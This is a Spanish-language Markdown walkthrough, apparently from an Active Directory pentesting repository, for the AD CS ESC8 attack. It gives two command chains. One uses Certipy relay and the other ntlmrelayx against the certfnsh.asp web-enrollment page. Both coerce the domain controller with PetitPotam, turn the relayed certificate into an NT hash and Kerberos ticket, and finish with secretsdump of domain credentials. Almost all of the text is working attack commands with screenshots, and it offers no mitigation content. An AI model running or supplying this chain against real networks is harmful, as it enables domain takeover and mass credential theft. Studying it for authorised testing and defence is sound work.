# ADCS ESC8 Certipy

Aprovechando una vulnerabilidad en la inscripción web del ADCS

```Bash
# Identificar si el ADCS está configurado en el DC
openssl s_client -connect <Nombre DNS del DC>:636
# Comprobar que la inscripción web está configurada desde el navegador
http://<ip DC>/certsrv/certfnsh.asp
```
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/adcs_ESC8/files/esc81.png?raw=true "find adcs")
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/adcs_ESC8/files/esc82.png?raw=true "check web")

Ejecutando el ataque:

```Bash
# A la escucha del certificado
certipy relay -target <ip target> -ca <ip target> -template DomainController
```
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/adcs_ESC8/files/esc83.png?raw=true "get cert")

```Bash
# Coaccionando con PetitPotam
petitpotam.py <ip atacante> <Nombre DNS del DC>
```
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/adcs_ESC8/files/esc84.png?raw=true "coerce petitpotam")

```Bash
# Obteniendo el NT hash y el TGT
certipy auth -pfx <fichero.pfx> -dc-ip <ip del DC> 
```
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/adcs_ESC8/files/esc85.png?raw=true "get nt and TGT")

```Bash
# Utilizando el TGT y obteniendo credeciales del domino
export KRB5CCNAME=<ticket.ccache>
secretsdump -k -no-pass <DOMAIN>/'<user>'@<Nombre DNS del DC>

# Utilizando el hash y obteniendo credeciales del domino
secretsdump -hashes ':<Hash NT>' -no-pass <DOMAIN>/'<user>'@<Nombre DNS del DC>
```
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/adcs_ESC8/files/esc86.png?raw=true "get creds TGT")
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/adcs_ESC8/files/esc87.png?raw=true "get creds NT")



# ADCS ESC8 ntlmrelayx

```Bash
# Identificar si el ADCS está configurado en el DC
openssl s_client -connect <Nombre DNS del DC>:636
# Comprobar que la inscripción web está configurada desde el navegador
http://<ip DC>/certsrv/certfnsh.asp
```
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/adcs_ESC8/files/esc81.png?raw=true "find adcs")
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/adcs_ESC8/files/esc82.png?raw=true "check web")
Ejecutando el ataque:

```Bash
# A la escucha del certificado
ntlmrelayx.py -t http://<ip target>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/adcs_ESC8/files/esc88.png?raw=true "get certificates")
```Bash
# Coaccionando con PetitPotam
petitpotam.py <ip atacante> <Nombre DNS del DC>
```
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/adcs_ESC8/files/esc84.png?raw=true "coerce petitpotam")
```Bash
# Guardamos el base64 obtenido del ntlmrelax en el fichero "cert.b64"
# Obteniendo el TGT
gettgtpkinit.py -pfx-base64 $(cat cert.b64) '<DOMAIN>'/'<user>' '<nombre ticket>.ccache'
```
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/adcs_ESC8/files/esc89.png?raw=true "get TGT")
```Bash
# Utilizando el TGT y obteniendo credeciales del domino
export KRB5CCNAME=<nombre ticket>.ccache
secretsdump -k -no-pass <DOMAIN>/'<user>'@<Nombre DNS del DC>
```
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/adcs_ESC8/files/esc86.png?raw=true "get creds TGT")